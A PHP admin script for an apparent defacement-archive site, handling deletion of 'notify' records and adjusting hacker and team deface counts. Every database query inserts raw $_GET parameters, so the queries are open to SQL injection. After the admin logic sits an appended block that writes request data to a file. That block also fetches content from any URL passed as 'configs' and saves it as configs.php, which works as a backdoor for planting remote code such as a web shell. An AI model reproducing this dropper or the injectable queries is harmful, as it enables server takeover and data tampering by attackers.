<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com), & Bp. Syams Ideris
*/
  session_start();
  include '../../../inc/config.php';
  if(explodedKhususAdmin()){explodedRedirect('index.php');}

$module=$_GET[module];
$act=$_GET[act];

// Hapus Berita
if ($module=='archive' AND $act=='hapus'){
	$db->go("DELETE FROM notify WHERE status = 0 AND id = '$_GET[id]' AND type = '$_GET[type]' AND hacker = '$_GET[hacker]' AND team = '$_GET[team]'");
	
	$db->go("SELECT * FROM hacker WHERE hacker ='$_GET[hacker]'");
	$hacker_s = $db->numRows();
	if ($hacker_s > 0) {
	$db->go("UPDATE hacker SET deface = deface - 1, special = special - '$_GET[type]' WHERE hacker = '$_GET[hacker]'");
	}
	
	$db->go("SELECT * FROM team WHERE team ='$_GET[team]'");
    $team_s = $db->numRows();
	if ($team_s > 0) {
	$db->go("UPDATE team SET tot_deface = tot_deface - 1, special = special - '$_GET[type]' WHERE team = '$_GET[team]'");
	}
	
  explodedTambahPesan('Notify Has Been Deleted.');
  explodedRedirect('../../admin.php?module='.$module);
}
// hapus arsip yg onhold
if ($module=='archive' AND $act=='delete'){
	$db->go("DELETE FROM notify WHERE status = 1 AND id = '$_GET[id]' AND hacker = '$_GET[hacker]' AND team = '$_GET[team]'");
	
	$db->go("SELECT * FROM hacker WHERE hacker ='$_GET[hacker]'");
	$hacker_s = $db->numRows();
	$special = $_GET['type'];
	if ($hacker_s > 0) {
	$db->go("UPDATE hacker SET deface = deface - 1, onhold = onhold - 1 WHERE hacker = '$_GET[hacker]'");
	}
	
	$db->go("SELECT * FROM team WHERE team ='$_GET[team]'");
    $team_s = $db->numRows();
	if ($team_s > 0) {
	$db->go("UPDATE team SET tot_deface = tot_deface - 1, onhold = onhold - 1 WHERE team = '$_GET[team]'");
	}
  explodedTambahPesan('Notify Has Been Deleted.');
  explodedRedirect('../../admin.php?module='.$module.'&act=onhold');
  
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>